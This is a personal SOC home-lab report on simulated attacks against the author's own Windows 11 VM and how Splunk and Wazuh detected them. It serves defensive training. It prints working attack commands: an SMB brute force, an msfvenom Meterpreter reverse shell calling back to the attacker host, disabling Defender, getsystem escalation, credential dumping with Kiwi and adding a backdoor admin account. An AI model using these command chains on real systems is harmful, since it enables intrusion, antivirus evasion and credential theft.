# SOC Home Lab Project Report

## Security Operations Center (SOC) — Attack Simulation & Detection

---

**Prepared by:** Nayak  
**Project Duration:** June 24–26, 2026  
**Classification:** Personal Lab Documentation  
**Version:** 1.0

---

## Table of Contents

1. Executive Summary
2. Lab Environment & Architecture
3. Tools & Technologies
4. Attack Scenarios & Detection
   - Phase 1: Network Reconnaissance
   - Phase 2: Brute Force Attack
   - Phase 3: Malware Simulation & Reverse Shell
   - Phase 4: Privilege Escalation
5. MITRE ATT&CK Coverage
6. Detection Statistics
7. Key Findings
8. Recommendations
9. Conclusion

---

## 1. Executive Summary

This project demonstrates a fully functional Security Operations Center (SOC)
home lab built on VMware Workstation 17 Pro. The lab simulates real-world
cyber attacks against a Windows 11 victim machine, with all activity monitored
and detected using Splunk Enterprise and Wazuh SIEM platforms.

Over a three-day period, four complete attack scenarios were executed from a
Kali Linux attacker machine and successfully detected using industry-standard
blue team tools. The project covers the full attack lifecycle from initial
reconnaissance through privilege escalation to NT AUTHORITY\SYSTEM, producing
659 security alerts and mapping to 10 MITRE ATT&CK tactics.

### Key Outcomes

| Metric | Value |
|--------|-------|
| Attack Scenarios Completed | 4 |
| Total Wazuh Alerts Generated | 659 |
| MITRE ATT&CK Tactics Covered | 10 |
| Unique Detection Rules Triggered | 25+ |
| Incident Reports Written | 4 |
| Maximum Privilege Achieved | NT AUTHORITY\SYSTEM |
| Splunk Events Collected | 2,277+ Sysmon events |

---

## 2. Lab Environment & Architecture

### 2.1 Network Topology

```
                    VMware NAT Network: 192.168.128.0/24
                              |
              ┌───────────────┼───────────────┐
              │               │               │
    ┌─────────▼──────┐ ┌──────▼───────┐ ┌───▼────────────┐
    │  Kali Linux    │ │ Windows 11   │ │    Ubuntu      │
    │  (Attacker)    │ │  (Victim)    │ │    (SIEM)      │
    │                │ │              │ │                │
    │ 192.168.128    │ │ 192.168.128  │ │ 192.168.128    │
    │    .164        │ │    .162      │ │    .163        │
    │                │ │              │ │                │
    │ RED TEAM       │ │ TARGET       │ │ BLUE TEAM      │
    └────────────────┘ └──────────────┘ └────────────────┘
```

### 2.2 Machine Specifications

| Machine | OS | IP Address | Role | Key Tools |
|---------|-----|------------|------|-----------|
| Kali Linux | Kali Rolling 2026 | 192.168.128.164 | Attacker / Red Team | Nmap, CrackMapExec, Metasploit, Kiwi |
| Windows 11 | Win 11 Home 24H2 (Build 26200) | 192.168.128.162 | Victim / Target | Sysmon v10.2, Wazuh Agent v4.14.5, Splunk UF |
| Ubuntu | Ubuntu LTS | 192.168.128.163 | SIEM / Blue Team | Splunk Enterprise 10.4.0, Wazuh Manager |

**Platform:** VMware Workstation 17 Pro  
**Network:** NAT (192.168.128.0/24)  
**Hostname (Victim):** NAYAK_RO  

### 2.3 Log Flow Architecture

```
Windows 11 (Victim)
        │
        ├── Sysmon (Advanced Event Logging)
        │       └── EventCode 1  (Process Creation)
        │       └── EventCode 3  (Network Connection)
        │       └── EventCode 11 (File Created)
        │       └── EventCode 22 (DNS Query)
        │
        ├── Splunk Universal Forwarder ──────► Splunk Enterprise :9997
        │                                              │
        └── Wazuh Agent ────────────────────► Wazuh Manager :1514
                                                       │
                                               Detection & Alerting
```

---

## 3. Tools & Technologies

### 3.1 Red Team Tools

| Tool | Version | Purpose |
|------|---------|---------|
| Nmap | 7.99 | Network reconnaissance and port scanning |
| CrackMapExec | Latest | SMB brute force and credential testing |
| Metasploit Framework | Latest | Exploitation and post-exploitation |
| msfvenom | Built-in | Malicious payload generation |
| Mimikatz (Kiwi) | 2.2.0 | Credential access and SYSTEM verification |
| smbclient | Built-in | SMB share enumeration and file transfer |

### 3.2 Blue Team Tools

| Tool | Version | Purpose |
|------|---------|---------|
| Splunk Enterprise | 10.4.0 | SIEM, log aggregation, search and dashboards |
| Wazuh Manager | 4.x | Threat detection, alerting, MITRE mapping |
| Wazuh Agent | 4.14.5 | Log forwarding from Windows victim |
| Sysmon | 10.2 | Advanced Windows process and network logging |
| Splunk Universal Forwarder | Latest | Windows log forwarding to Splunk |

### 3.3 Key Splunk Configuration

- **Index:** main
- **Sourcetypes:** WinEventLog:Security, WinEventLog:Microsoft-Windows-Sysmon/Operational
- **Total events collected:** 2,277+ (last 24 hours at peak)
- **Key EventCodes monitored:** 1, 3, 4624, 4625, 4672, 4732

---

## 4. Attack Scenarios & Detection

---

### Phase 1: Network Reconnaissance (IR-001)

**Severity:** Low  
**Date:** 2026-06-24  
**MITRE Tactic:** Reconnaissance (TA0043)

#### 4.1.1 Attack Description

Network reconnaissance was performed from Kali Linux against the entire
192.168.128.0/24 subnet. Three Nmap scans were executed in sequence:
a host discovery ping sweep, a full port scan with service detection,
and an aggressive scan to gather OS fingerprinting and script results.

#### 4.1.2 Commands Executed

```bash
# Host Discovery
nmap -sn 192.168.128.0/24

# Full Port + Service Scan
nmap -sV -sC -O -p- 192.168.128.162

# Aggressive Scan
nmap -A 192.168.128.162 -oN nmap-aggressive-scan.txt
```

#### 4.1.3 Findings

| Discovery | Detail |
|-----------|--------|
| Hosts discovered | 6 (including .1, .2, .162, .163, .164, .254) |
| Open ports on victim | 135 (RPC), 139 (NetBIOS), 445 (SMB) |
| OS fingerprinted | Microsoft Windows 11 24H2 |
| Hostname | NAYAK_RO |
| SMB security | Signing enabled and required |
| Scan duration | 103 seconds (full), 31 seconds (aggressive) |

#### 4.1.4 Detection Evidence

**Splunk:** 57 EventCode=3 (network connection) events captured from
Sysmon, showing outbound connections from victim. Field extraction via
rex commands successfully parsed SourceIp, DestinationIp, DestinationPort.

**Wazuh:** 360 total alerts during reconnaissance window including:
- Rule 92052 — Windows command prompt by abnormal process (Level 4)
- Rule 92213 — Executable file dropped in malware folder (Level 15)

---

### Phase 2: SMB Brute Force Attack (IR-002)

**Severity:** High  
**Date:** 2026-06-25  
**MITRE Tactic:** Credential Access (TA0006), Initial Access (TA0001)

#### 4.2.1 Attack Description

Using intelligence from Phase 1 (port 445 SMB open), a brute force attack
was launched against the Windows Administrator account using CrackMapExec
with a custom 12-password wordlist. After enabling the built-in Administrator
account on the victim and fixing SMB authentication, CrackMapExec successfully
brute-forced the credential.

#### 4.2.2 Commands Executed

```bash
# Test connectivity
crackmapexec smb 192.168.128.162 -u administrator -p 2020
# Result: [+] Nayak_RO\administrator:2020 (Pwn3d!)

# Full brute force
crackmapexec smb 192.168.128.162 -u administrator \
  -p /tmp/passwords.txt 2>&1 | tee brute-force-results.txt
```

#### 4.2.3 Wordlist Used

admin, password, 123456, Password1, administrator,
letmein, welcome, nayak, nayak123, **2020** ✅, Password@123, qwerty

#### 4.2.4 Result

```
[-] administrator:administrator — STATUS_LOGON_FAILURE
[+] administrator:2020 — (Pwn3d!) ✅
```

#### 4.2.5 Detection Evidence

**Splunk EventCode 4625 (Failed Logons):**
- 10 failed authentication events from 192.168.128.164
- Account: administrator, Domain: Nayak_RO
- Failure Reason: Unknown user name or bad password
- Logon Type: 3 (Network/SMB)

**Splunk EventCode 4624 (Successful Logon):**
- 11 successful logon events from 192.168.128.164
- Authentication Package: NTLM V2

**Wazuh Alert Chain:**

| Rule | Description | Level |
|------|-------------|-------|
| 60122 | Logon Failure — Unknown user or bad password | 5 |
| 60204 | Multiple Windows Logon Failures | 10 |
| 92652 | Successful Remote Logon — possible pass-the-hash | 6 |
| 67028 | Special privileges assigned to new logon | 3 |
| 92657 | NTLM auth — Possible RDP connection | 6 |

**Wazuh JSON Evidence:** Full alert captured with MITRE mapping:
- T1550.002 — Pass the Hash
- T1078.002 — Domain Accounts

---

### Phase 3: Malware Simulation & Reverse Shell (IR-003)

**Severity:** Critical  
**Date:** 2026-06-25  
**MITRE Tactic:** Execution (TA0002), C2 (TA0011), Defense Evasion (TA0005)

#### 4.3.1 Attack Description

A Windows x64 Meterpreter reverse TCP payload was generated using msfvenom
and uploaded to the victim via SMB using the previously compromised
administrator credentials. Windows Defender initially detected and deleted
the file, requiring real-time monitoring to be disabled. The payload was
re-uploaded and executed via PowerShell Start-Process, establishing a
reverse shell to the attacker on port 4444.

#### 4.3.2 Commands Executed

```bash
# Payload generation
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.128.164 LPORT=4444 \
  -f exe -o /tmp/malware.exe
# Output: 7680 bytes

# Listener
msfconsole -q -x "use exploit/multi/handler; \
  set payload windows/x64/meterpreter/reverse_tcp; \
  set LHOST 192.168.128.164; set LPORT 4444; run"

# File transfer via SMB
smbclient //192.168.128.162/C$ -U administrator%2020 \
  -c "put /tmp/malware.exe malware.exe"

# Windows — Defender bypass
Set-MpPreference -DisableRealtimeMonitoring $true

# Windows — Execution
Start-Process "C:\malware.exe"
```

#### 4.3.3 Session Established

```
[*] Sending stage (248902 bytes) to 192.168.128.162
[*] Meterpreter session 1 opened
    (192.168.128.164:4444 -> 192.168.128.162:57200)
```

#### 4.3.4 Post-Exploitation

```
sysinfo   → NAYAK_RO | Windows 11 24H2+ Build 26200 | x64
getuid    → NAYAK_RO\nayak
getpid    → 1840
ps        → Full process list (splunkd.exe visible!)
ipconfig  → 192.168.128.162 confirmed
shell     → Windows CMD access
net user  → Administrator, DefaultAccount, Guest, hacker*, nayak
net localgroup administrators → Administrator, nayak
```

*"hacker" account discovered — pre-existing on system since 2026-06-13*

#### 4.3.5 Malware IOCs

| IOC | Value |
|-----|-------|
| File path | C:\malware.exe |
| File size | 7680 bytes |
| MD5 | 5A21336963046E8CF919C99B2D7BC8A6 |
| SHA256 | 7BC9F6E2B98C4D0362CC2A20E664C98B07EF5D0538B2BA13F8AADD980C3D5F43 |
| Parent process | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe |
| C2 IP | 192.168.128.164 |
| C2 Port | 4444 TCP |
| Protocol | Meterpreter reverse_tcp |

#### 4.3.6 Detection Evidence

**Splunk EventCode 1 (Process Creation):**
- 6 events of C:\malware.exe process creation detected
- Parent process: powershell.exe
- MD5 and SHA256 hashes captured by Sysmon

**Splunk EventCode 3 (Network Connection):**
- 1 event — reverse shell callback
- C:\malware.exe → 192.168.128.164:4444

**Wazuh Alerts:**

| Rule | Description | Level |
|------|-------------|-------|
| 61638 | Sysmon — Suspicious Process — dllhost.exe | 12 |
| 92058 | Application Compatibility Database launched | 12 |
| 92031 | Discovery activity executed (x4) | 3 |
| 92213 | Executable file dropped in malware folder | 15 |
| 92039 | net.exe account discovery initiated | 3 |

---

### Phase 4: Privilege Escalation (IR-004)

**Severity:** Critical  
**Date:** 2026-06-26  
**MITRE Tactic:** Privilege Escalation (TA0004), Persistence (TA0003)

#### 4.4.1 Attack Description

Using the active Meterpreter session from Phase 3, privilege escalation
was achieved from NAYAK_RO\nayak to NT AUTHORITY\SYSTEM using Named Pipe
Impersonation (getsystem Technique 1), enabled by the SeImpersonatePrivilege
being active on the victim. Mimikatz (Kiwi extension) was loaded confirming
SYSTEM-level execution. A local exploit suggester identified 15 persistence
vectors. The pre-existing "hacker" backdoor account was added to the
Administrators group, establishing persistent elevated access.

#### 4.4.2 Commands Executed

```bash
# Meterpreter
getsystem
# Result: got system via technique 1 (Named Pipe Impersonation In Memory/Admin)

getuid
# Result: NT AUTHORITY\SYSTEM

load kiwi
creds_all
# [+] Running as SYSTEM

run post/multi/recon/local_exploit_suggester
# 15 persistence vectors identified

shell
whoami /groups      # Mandatory Label\System Mandatory Level
reg query HKLM\SAM  # SAM registry accessed
net localgroup administrators hacker /add
# The command completed successfully
```

#### 4.4.3 Escalation Details

| Field | Value |
|-------|-------|
| Technique | Named Pipe Impersonation (In Memory/Admin) |
| Prerequisite | SeImpersonatePrivilege — Enabled |
| Final privilege | NT AUTHORITY\SYSTEM |
| Mandatory Level | S-1-16-16384 (System) |
| MITRE | T1134.001 — Token Impersonation/Theft |

#### 4.4.4 Enabled Privileges (Key)

| Privilege | State |
|-----------|-------|
| SeDebugPrivilege | **Enabled** |
| SeImpersonatePrivilege | **Enabled** |
| SeCreateGlobalPrivilege | **Enabled** |
| SeChangeNotifyPrivilege | **Enabled** |

#### 4.4.5 Persistence Vectors (15 Found)

Registry, Startup Folder, Task Scheduler, Windows Service, BITS,
PowerShell Profile, Accessibility Features, Assistive Technology,
Service Lock/Unlock/Logon/Schedule, UserInit MPR Logon Script,
MS16-075 Reflection

#### 4.4.6 Critical Finding — Pre-existing Backdoor

| Field | Value |
|-------|-------|
| Account | hacker |
| Created | 2026-06-13 1:49 PM (12 days before exercise) |
| Last logon | 2026-06-13 1:55 PM |
| Status before | Users group only |
| Status after | **Administrators** (escalated by attacker) |

#### 4.4.7 Detection Evidence

**Splunk:** EventCode 4672 (Special Privileges), EventCode 4732
(User Added to Admin Group) queries prepared and documented.

**Wazuh Alerts:**

| Rule | Description | Level |
|------|-------------|-------|
| 60154 | Administrators Group Changed | 12 |
| 67028 | Special privileges assigned to new logon | 3 |
| 61618 | Sysmon — Suspicious Process — svchost.exe | 12 |
| 60110 | User account changed | 8 |
| 60109 | User account enabled or created | 8 |
| 92043 | Netsh used to add firewall rule | 10 |
| 92205 | PowerShell created executable in Windows root | 9 |

---

## 5. MITRE ATT&CK Coverage

### 5.1 Tactics Covered (10 of 14)

| Tactic | Alerts | Top Technique |
|--------|--------|--------------|
| Privilege Escalation | **148** | T1059.003 — Windows Command Shell (105) |
| Execution | **112** | T1055 — Process Injection (64) |
| Defense Evasion | **112** | T1543.003 — Windows Service (53) |
| Persistence | **75** | T1087 — Account Discovery (49) |
| Discovery | **49** | T1070.004 — File Deletion (18) |
| Lateral Movement | **15** | T1078.002 — Domain Accounts (14) |
| Initial Access | **14** | T1105 — Ingress Tool Transfer (10) |
| Command and Control | **10** | T1021.001 — Remote Desktop Protocol (10) |
| Impact | **9** | T1098 — Account Manipulation (5) |
| Credential Access | **1** | T1110 — Brute Force (1) |

### 5.2 Key Techniques Detected

| Technique ID | Name | Count | Phase |
|-------------|------|-------|-------|
| T1059.003 | Windows Command Shell | 105 | All |
| T1055 | Process Injection | 64 | Phase 3 |
| T1543.003 | Windows Service | 53 | Phase 4 |
| T1087 | Account Discovery | 49 | Phase 3-4 |
| T1078.002 | Domain Accounts | 14 | Phase 2 |
| T1105 | Ingress Tool Transfer | 10 | Phase 3 |
| T1550.002 | Pass the Hash | 14 | Phase 2 |
| T1098 | Account Manipulation | 5 | Phase 4 |
| T1110 | Brute Force | 1 | Phase 2 |
| T1134.001 | Token Impersonation | — | Phase 4 |

---

## 6. Detection Statistics

### 6.1 Splunk Summary

| Metric | Value |
|--------|-------|
| Total Sysmon events (24h) | 2,277 |
| EventCode 1 (Process Creation) | 1,886 |
| EventCode 3 (Network Connection) | 135 |
| EventCode 13 (Registry) | 185 |
| EventCode 22 (DNS Query) | 40 |
| Security EventCode 4625 (Failed Login) | 10 |
| Security EventCode 4624 (Successful Login) | 11 |
| Malware process events detected | 6 |
| Reverse shell connections detected | 1 |

### 6.2 Wazuh Summary

| Metric | Value |
|--------|-------|
| Total alerts (full project) | **659** |
| Level 12+ critical alerts | **110** |
| Authentication failures | 10 |
| Authentication successes | 17 |
| Unique rules triggered | 25+ |
| MITRE techniques mapped | 15+ |

### 6.3 Alert Severity Distribution

| Level | Count | Severity |
|-------|-------|---------|
| Level 15 | 3 | Critical |
| Level 12 | 67 | High |
| Level 10 | 2 | Medium-High |
| Level 8-9 | 11 | Medium |
| Level 3-6 | 576 | Low-Info |

### 6.4 Top Wazuh Rules Fired

| Rule ID | Description | Level | Count |
|---------|-------------|-------|-------|
| 92052 | Windows cmd by abnormal process | 4 | 72 |
| 61618 | Suspicious svchost.exe | 12 | 39 |
| 92032 | Suspicious Windows cmd shell | 3 | 33 |
| 61638 | Suspicious dllhost.exe | 12 | 22 |
| 92021 | PowerShell deleted files | 3 | 18 |
| 67028 | Special privileges assigned | 3 | 14 |
| 92031 | Discovery activity executed | 3 | 12 |
| 92657 | Pass-the-hash detected | 6 | 10 |
| 60122 | Logon Failure | 5 | 9 |
| 92213 | Executable in malware folder | 15 | 3 |

---

## 7. Key Findings

### 7.1 Critical Security Issues Identified

**Finding 1 — Pre-existing Backdoor Account**
A user account named "hacker" was discovered on the victim machine, created
on 2026-06-13, twelve days before this exercise began. The account was active
and had not been detected by any monitoring. During the exercise, the attacker
elevated this account to Administrators.
Severity: Critical | Recommendation: Immediate removal and investigation.

**Finding 2 — Weak Administrator Password**
The built-in Administrator account used the password "2020" which was cracked
in a 12-attempt wordlist. This represents a severe password policy failure.
Severity: Critical | Recommendation: Enforce complex password policy minimum
14 characters.

**Finding 3 — SMB Port 445 Exposed Internally**
Port 445 was accessible from all internal hosts with no segmentation, enabling
the brute force attack. SMB signing was enabled but authentication was not
adequately protected.
Severity: High | Recommendation: Restrict SMB to required hosts only.

**Finding 4 — Windows Defender Tamper Protection Disabled**
The attacker was able to disable Windows Defender real-time monitoring via
PowerShell, allowing malware to persist on disk.
Severity: High | Recommendation: Enable Defender tamper protection.

**Finding 5 — SeImpersonatePrivilege Enabled**
The nayak user account had SeImpersonatePrivilege enabled, which directly
enabled the Named Pipe Impersonation privilege escalation to SYSTEM.
Severity: High | Recommendation: Disable for non-service accounts.

**Finding 6 — 15 Persistence Vectors Available**
The local exploit suggester identified 15 viable persistence mechanisms
including registry, startup folder, task scheduler, and Windows services.
Severity: High | Recommendation: Apply CIS Windows 11 Benchmark hardening.

**Finding 7 — No Outbound Port Filtering**
Port 4444 outbound was not blocked, allowing the reverse shell C2 callback
to succeed without any network-level detection.
Severity: Medium | Recommendation: Implement egress filtering.

### 7.2 What the SIEM Detected Well

- Multiple failed logins correlated into brute force alert (Rule 60204)
- Malware process creation captured with full hash (MD5 + SHA256)
- Reverse shell network connection to attacker IP logged
- Account manipulation and admin group changes alerted immediately
- MITRE ATT&CK techniques automatically mapped by Wazuh
- dllhost.exe process injection flagged as Level 12

### 7.3 Detection Gaps Identified

- Nmap scan was not directly alerted as a port scan (Sysmon captured
  individual connections but no aggregate scan detection rule existed)
- Splunk required manual rex field extraction — no automatic field parsing
  for Sysmon XML events was configured

---

## 8. Recommendations

### 8.1 Immediate Actions

| Priority | Action | Addresses |
|----------|--------|-----------|
| P1 | Remove "hacker" backdoor account | Finding 1 |
| P1 | Reset Administrator password (14+ chars) | Finding 2 |
| P1 | Re-enable Windows Defender + tamper protection | Finding 4 |
| P2 | Implement account lockout policy (5 attempts / 30 min) | Finding 2 |
| P2 | Block outbound port 4444 at network level | Finding 7 |
| P2 | Restrict SMB to required hosts | Finding 3 |

### 8.2 Short-term Improvements

| Action | Benefit |
|--------|---------|
| Enable Credential Guard | Blocks Mimikatz/Kiwi attacks |
| Deploy AppLocker | Prevent unauthorized executable runs |
| Configure Splunk field extractions | Auto-parse Sysmon XML fields |
| Add port scan detection rule | Alert on 50+ unique ports from 1 IP/min |
| Weekly local account audits | Detect rogue accounts like "hacker" |

### 8.3 Long-term Hardening

| Action | Benefit |
|--------|---------|
| Apply CIS Windows 11 Benchmark | Eliminate 15 persistence vectors |
| Network segmentation | Limit lateral movement |
| Deploy EDR solution | Behavioral detection for getsystem |
| Implement SOAR | Automate response to Wazuh Level 12+ alerts |
| Regular penetration testing | Identify new attack surfaces |

---

## 9. Conclusion

This SOC home lab project successfully demonstrates a complete attack and
detection lifecycle across four distinct attack scenarios. Starting from
network reconnaissance through to full SYSTEM-level compromise, every phase
was detected by the Splunk and Wazuh SIEM stack with appropriate alert
severity levels.

The project validates the effectiveness of Sysmon as a Windows telemetry
source, with its EventCode 1 (process creation) and EventCode 3 (network
connection) events providing the critical data needed to detect malware
execution and C2 callbacks. Wazuh's automatic MITRE ATT&CK mapping added
significant analytical value, automatically categorizing 659 alerts across
10 tactics without manual intervention.

From a blue team perspective, the most impactful detections were the Wazuh
Multiple Logon Failures alert (Rule 60204, Level 10) for the brute force
phase and the Administrators Group Changed alert (Rule 60154, Level 12) for
the persistence phase. These rules provide actionable, high-fidelity alerts
that a real SOC analyst would prioritize immediately.

The discovery of the pre-existing "hacker" backdoor account — undetected for
12 days — underscores the importance of regular account auditing and
highlights that even a well-instrumented SIEM requires proper alert tuning
and analyst review to catch all threats.

This project demonstrates practical proficiency in SOC operations including
threat simulation, log analysis, SIEM tool usage, MITRE ATT&CK framework
application, and incident report writing — all core competencies for a
SOC Analyst role.

---

## Appendix A — Incident Reports Summary

| IR | Title | Severity | MITRE |
|----|-------|----------|-------|
| IR-001 | Nmap Network Reconnaissance | Low | TA0043 |
| IR-002 | SMB Brute Force — Credential Compromise | High | TA0006, TA0001 |
| IR-003 | Malware Execution — Meterpreter Reverse Shell | Critical | TA0002, TA0011 |
| IR-004 | Privilege Escalation — SYSTEM + Persistence | Critical | TA0004, TA0003 |

## Appendix B — Splunk SPL Queries Reference

```spl
-- Sysmon Event Overview
index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational"
| rex field=_raw "<EventID>(?<EventCode>\d+)</EventID>"
| stats count by EventCode | sort -count

-- Malware Detection
index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational"
| rex field=_raw "<EventID>(?<EventCode>\d+)</EventID>"
| rex field=_raw "<Data Name='Image'>(?<Image>[^<]+)</Data>"
| search EventCode=1 Image="C:\\malware.exe"
| table _time, host, Image, EventCode

-- Brute Force Detection
index=main source="WinEventLog:Security" EventCode=4625
| stats count by Account_Name, Source_Network_Address | sort -count

-- Reverse Shell Detection
index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational"
| rex field=_raw "<EventID>(?<EventCode>\d+)</EventID>"
| rex field=_raw "<Data Name='DestinationIp'>(?<DestinationIp>[^<]+)</Data>"
| search EventCode=3 DestinationIp="192.168.128.164"
| table _time, host, DestinationIp

-- Privilege Escalation
index=main source="WinEventLog:Security" EventCode=4672
| table _time, host, Account_Name, Privilege_List

-- Admin Group Change
index=main source="WinEventLog:Security" EventCode=4732
| table _time, host, Account_Name, Member_Name
```

## Appendix C — Tools Reference

| Tool | Download | Purpose |
|------|----------|---------|
| Sysmon | docs.microsoft.com/sysinternals | Windows advanced logging |
| Splunk | splunk.com | SIEM platform |
| Wazuh | wazuh.com | Open source XDR/SIEM |
| SwiftOnSecurity Sysmon Config | github.com/SwiftOnSecurity/sysmon-config | Sysmon ruleset |
| Metasploit | metasploit.com | Exploitation framework |
| Nmap | nmap.org | Network scanner |

---

*Report generated: June 26, 2026*  
*Lab conducted in isolated VMware environment for educational purposes only*  
*All attacks performed against personally owned virtual machines*
